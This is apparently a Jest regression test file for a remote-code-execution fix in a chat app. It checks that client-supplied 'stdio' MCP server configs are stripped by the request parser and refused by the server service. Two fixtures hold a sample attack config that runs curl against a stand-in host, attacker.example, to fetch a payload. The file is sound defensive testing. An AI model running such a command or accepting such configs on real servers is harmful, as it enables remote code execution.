/**
 * @jest-environment node
 *
 * Regression tests for the MCP stdio RCE fix (Plan 002).
 *
 * 1. The request-body parser (`parseChatRequestBody`) must drop any client-supplied
 *    `type: 'stdio'` MCP server configs at the trust boundary — stdio spawns
 *    server-side processes from client input and must never be accepted.
 * 2. The MCP server service must refuse stdio configs authoritatively, so any
 *    caller that bypasses the parser is still protected. The `StdioClientTransport`
 *    constructor must never be reached for client input.
 */
import { parseChatRequestBody } from '@/lib/chat/chatRequest';
import { ChatMCPServerService } from '@/lib/services/chatMCPServerService';

// Mock the MCP SDK transports so the test can assert the stdio transport is
// never constructed. If the guard were removed, StdioClientTransport would be
// called and the assertion would fail.
jest.mock('@modelcontextprotocol/sdk/client/stdio.js', () => ({
  StdioClientTransport: jest.fn(),
}));

jest.mock('@modelcontextprotocol/sdk/client/sse.js', () => ({
  SSEClientTransport: jest.fn(),
}));

jest.mock('@modelcontextprotocol/sdk/client/streamableHttp.js', () => ({
  StreamableHTTPClientTransport: jest.fn(),
}));

jest.mock('@modelcontextprotocol/sdk/client/index.js', () => ({
  Client: jest.fn(),
}));

jest.mock('child_process', () => ({
  spawn: jest.fn(),
}));

jest.mock('@/lib/utils/performantLogging', () => ({
  logDiagnostic: jest.fn(),
}));

// Import after mocks are registered.
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';

// `StdioClientTransport` is a class; cast through `jest.MockedClass` so the
// type system accepts the mock. The mock factory above replaces it with a
// `jest.fn()`, so `.mock.calls` is available at runtime.
const MockedStdioClientTransport = StdioClientTransport as unknown as jest.Mock;

describe('MCP stdio RCE guard', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it('parseChatRequestBody strips type: "stdio" entries and keeps other transports', () => {
    // Suppress the expected console.warn from the filter so the test output
    // stays clean; the warning is the intended behavior, not noise.
    const warnSpy = jest.spyOn(console, 'warn').mockImplementation(() => {});

    const body = {
      selectedModel: 'openai/gpt-4',
      mcpServers: [
        {
          type: 'stdio',
          url: '',
          command: 'curl',
          args: ['http://attacker.example/payload'],
        },
        {
          type: 'streamable-http',
          url: 'https://example.com/mcp',
        },
        {
          type: 'sse',
          url: 'https://example.com/sse',
        },
      ],
    };

    const parsed = parseChatRequestBody(body);

    // The stdio entry must be dropped; the http/sse entries must survive.
    expect(parsed.mcpServers).toHaveLength(2);
    expect(parsed.mcpServers.every((s) => s.type !== 'stdio')).toBe(true);
    expect(parsed.mcpServers.map((s) => s.type).sort()).toEqual([
      'sse',
      'streamable-http',
    ]);

    // The filter logs a warning for each rejected stdio entry (1 here).
    expect(warnSpy).toHaveBeenCalledTimes(1);
    expect(warnSpy.mock.calls[0][0]).toMatch(/Rejected client-supplied stdio/);

    warnSpy.mockRestore();
  });

  it('parseChatRequestBody drops all-stdio input to an empty list', () => {
    const warnSpy = jest.spyOn(console, 'warn').mockImplementation(() => {});

    const parsed = parseChatRequestBody({
      selectedModel: 'openai/gpt-4',
      mcpServers: [
        { type: 'stdio', url: '', command: 'anything', args: [] },
      ],
    });

    expect(parsed.mcpServers).toHaveLength(0);
    warnSpy.mockRestore();
  });

  it('ChatMCPServerService refuses a stdio config and never constructs StdioClientTransport', async () => {
    await expect(
      ChatMCPServerService.initializeMCPServers({
        mcpServers: [
          {
            type: 'stdio',
            url: '',
            command: 'curl',
            args: ['http://attacker.example/payload'],
          },
        ],
        selectedModel: 'openai/gpt-4',
      })
    ).rejects.toThrow(/MCP_STDIO_BLOCKED/);

    // Defense-in-depth: even though initializeMCPServers caught the throw, the
    // guard rethrows MCP_STDIO_BLOCKED so the request fails. And critically,
    // the spawn-capable transport was never constructed.
    expect(MockedStdioClientTransport).not.toHaveBeenCalled();
  });
});
